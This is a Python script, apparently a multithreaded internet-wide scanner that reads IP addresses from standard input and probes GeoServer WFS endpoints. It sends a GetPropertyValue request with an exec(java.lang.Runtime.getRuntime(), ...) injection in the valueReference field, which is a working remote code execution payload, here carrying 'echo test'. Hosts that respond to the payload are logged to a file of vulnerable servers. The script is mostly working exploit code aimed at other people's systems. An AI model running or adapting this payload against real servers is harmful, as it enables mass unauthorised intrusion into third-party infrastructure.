
#!/usr/bin/env python3
import sys
import socket
import threading
import time
import requests
import xml.etree.ElementTree as ET
from queue import Queue
from threading import Lock
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class GeoServerScanner:
    def __init__(self, output_file="vulnerable_geoservers.txt", threads=50, port=8080):
        self.output_file = output_file
        self.threads = threads
        self.port = port
        self.ip_queue = Queue()
        self.file_lock = Lock()
        self.running = True
        
    def check_geoserver_vulnerability(self, ip):
        """Check if GeoServer on given IP is vulnerable"""
        try:
            # Try both HTTP and HTTPS on specified port
            for protocol in ['http', 'https']:
                if self.port in [80, 443]:
                    # For standard ports, don't specify port in URL
                    if (protocol == 'http' and self.port == 80) or (protocol == 'https' and self.port == 443):
                        url = f"{protocol}://{ip}"
                    else:
                        url = f"{protocol}://{ip}:{self.port}"
                else:
                    url = f"{protocol}://{ip}:{self.port}"
                    
                if self._test_geoserver(url):
                    return url
                    
        except Exception as e:
            pass
        return None
        
    def _test_geoserver(self, url):
        """Test if URL has vulnerable GeoServer"""
        try:
            # First check if GeoServer WFS endpoint exists
            wfs_url = f"{url}/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0"
            
            session = requests.Session()
            session.timeout = 10
            
            response = session.get(wfs_url, verify=False, timeout=10)
            
            if response.status_code == 200:
                # Try to parse feature types
                try:
                    tree = ET.fromstring(response.content)
                    namespaces = {"wfs": "http://www.opengis.net/wfs/2.0"}
                    feature_types = [
                        elem.text for elem in tree.findall(".//wfs:ReturnFeatureType", namespaces)
                    ]
                    
                    if feature_types:
                        # Test vulnerability with first feature type
                        return self._test_vulnerability(session, url, feature_types[0])
                        
                except ET.ParseError:
                    pass
                    
        except Exception:
            pass
        return False
        
    def _test_vulnerability(self, session, url, feature_type):
        """Test actual vulnerability exploitation"""
        try:
            full_url = f"{url}/geoserver/wfs"
            headers = {
                "Accept-Encoding": "gzip, deflate, br",
                "Accept": "*/*",
                "User-Agent": "GeoServerScanner/1.0",
                "Connection": "close",
                "Content-Type": "application/xml",
            }
            
            # Test payload - harmless command that should trigger vulnerability indicator
            test_command = "echo test"
            payload = f"""
                <wfs:GetPropertyValue service='WFS' version='2.0.0'
                xmlns:topp='http://www.openplans.org/topp'
                xmlns:fes='http://www.opengis.net/fes/2.0'
                xmlns:wfs='http://www.opengis.net/wfs/2.0'>
                <wfs:Query typeNames='{feature_type}'/>
                <wfs:valueReference>exec(java.lang.Runtime.getRuntime(), "{test_command}")</wfs:valueReference>
                </wfs:GetPropertyValue>
            """
            
            response = session.post(full_url, headers=headers, data=payload, verify=False, timeout=5)
            
            # Check for vulnerability indicators
            if response.status_code == 400 and "NoApplicableCode" in response.text:
                return True
                
        except Exception:
            pass
        return False
        
    def maintain_session(self, ip, url):
        """Maintain session for 30 seconds to verify stability"""
        try:
            session = requests.Session()
            start_time = time.time()
            
            while time.time() - start_time < 30:
                try:
                    response = session.get(f"{url}/geoserver/web/", verify=False, timeout=5)
                    if response.status_code not in [200, 401, 403]:
                        return False
                    time.sleep(5)  # Check every 5 seconds
                except:
                    return False
                    
            return True
            
        except Exception:
            return False
            
    def write_result(self, ip, url):
        """Write vulnerable server to file"""
        with self.file_lock:
            with open(self.output_file, 'a') as f:
                f.write(f"{ip} | {url}\n")
                f.flush()
                
    def worker(self):
        """Worker thread for processing IPs"""
        while self.running:
            try:
                ip = self.ip_queue.get(timeout=1)
                if ip is None:
                    break
                    
                print(f"[*] Scanning {ip}", flush=True)
                
                vulnerable_url = self.check_geoserver_vulnerability(ip)
                
                if vulnerable_url:
                    print(f"[+] Found vulnerable GeoServer: {ip} -> {vulnerable_url}", flush=True)
                    
                    # Maintain session for 30 seconds
                    if self.maintain_session(ip, vulnerable_url):
                        print(f"[+] Session stable for {ip}, writing to file", flush=True)
                        self.write_result(ip, vulnerable_url)
                    else:
                        print(f"[-] Session unstable for {ip}, skipping", flush=True)
                else:
                    print(f"[-] {ip} not vulnerable", flush=True)
                    
                self.ip_queue.task_done()
                
            except Exception as e:
                continue
                
    def read_stdin(self):
        """Read IPs from stdin in real-time"""
        try:
            for line in sys.stdin:
                ip = line.strip()
                if ip and self._is_valid_ip(ip):
                    self.ip_queue.put(ip)
                    
        except KeyboardInterrupt:
            pass
        finally:
            self.running = False
            # Add None sentinels to stop workers
            for _ in range(self.threads):
                self.ip_queue.put(None)
                
    def _is_valid_ip(self, ip):
        """Validate IP address format"""
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False
            
    def run(self):
        """Main scanner loop"""
        print(f"[*] Starting GeoServer scanner with {self.threads} threads")
        print(f"[*] Scanning port: {self.port}")
        print(f"[*] Results will be saved to {self.output_file}")
        print("[*] Reading IPs from stdin...")
        
        # Start worker threads
        workers = []
        for i in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            workers.append(t)
            
        # Start stdin reader
        stdin_thread = threading.Thread(target=self.read_stdin)
        stdin_thread.daemon = True
        stdin_thread.start()
        
        try:
            stdin_thread.join()
            
            # Wait for queue to be processed
            self.ip_queue.join()
            
            # Wait for workers to finish
            for t in workers:
                t.join()
                
        except KeyboardInterrupt:
            print("\n[*] Stopping scanner...")
            self.running = False
            
        print("[*] Scanner finished")

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='GeoServer vulnerability scanner')
    parser.add_argument('-p', '--port', type=int, default=8080, 
                       help='Port to scan (default: 8080)')
    parser.add_argument('-t', '--threads', type=int, default=50,
                       help='Number of threads (default: 50)')
    parser.add_argument('-o', '--output', default="vulnerable_geoservers.txt",
                       help='Output file (default: vulnerable_geoservers.txt)')
    
    args = parser.parse_args()
    
    scanner = GeoServerScanner(output_file=args.output, threads=args.threads, port=args.port)
    scanner.run()
